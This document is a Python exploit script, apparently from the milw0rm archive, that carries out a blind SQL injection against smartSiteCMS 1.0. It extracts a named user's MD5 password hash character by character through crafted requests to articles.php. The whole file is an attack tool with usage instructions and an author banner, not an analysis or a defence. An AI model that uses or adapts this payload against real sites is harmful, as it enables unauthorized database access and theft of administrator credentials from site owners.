#!/usr/bin/python

import sys
import re
from socket import *

class exploit:
	def __init__(self,host,path,user):
		self.host=host
		self.path=path
		self.user=user
		self.reg=re.compile("<!-- END COMMENT FORM -->")
	def set_query(self,n,ch):
		self.query="' OR ASCII(SUBSTRING((SELECT password FROM users WHERE userName='"+self.user+"'),"+str(n)+",1)) = "+str(ord(ch))+" OR '1'='2"
		self.query = self.query.replace(" ","%20")
		self.query = self.query.replace("'","%27")
		self.request="GET "+self.path+"/articles.php?var="+self.query+" HTTP/1.0\r\nHost: "+self.host+"\r\n\n"
	def check(self):
		sock=socket(AF_INET, SOCK_STREAM)
		sock.connect((self.host, 80))
		sock.send(self.request)
		r=""
		t="-"
		while(t!=""):
			t=sock.recv(1024)
			r+=t
		match=self.reg.search(r)
		if(r[match.start()+27:match.start()+59]!="<!-- END OF RELATED ARTICLES -->"):
			return 1
		else:
			return 0
		sock.close()

print "////*****************************************\\\\\\\\"
print "||||           smartSiteCMS 1.0 v1.0         ||||"
print "||||            Blind SQL injection          ||||"
print "||||					     ||||"
print "|||| ~Author: certaindeath                   ||||"
print "|||| ~Greetz: darkjoker                      ||||"
print "\\\\\\\\*****************************************////\n"

if(len(sys.argv) !=4 ):
	print "Usage:	python xpl.py <host> <cms path> <user>"
	print "Example: python xpl.py localhost /cms admin"
	sys.exit(0)

pwd=""
xpl = exploit(sys.argv[1],sys.argv[2],sys.argv[3])
n=1
while(n<=32):
	t=0
	xpl.set_query(n,str(t))
	while (xpl.check()!=1):
		t+=1
		xpl.set_query(n,str(hex(t))[-1])
	pwd+=str(hex(t))[-1]
	n+=1
print "pass [md5]: ",pwd

# milw0rm.com [2009-01-28]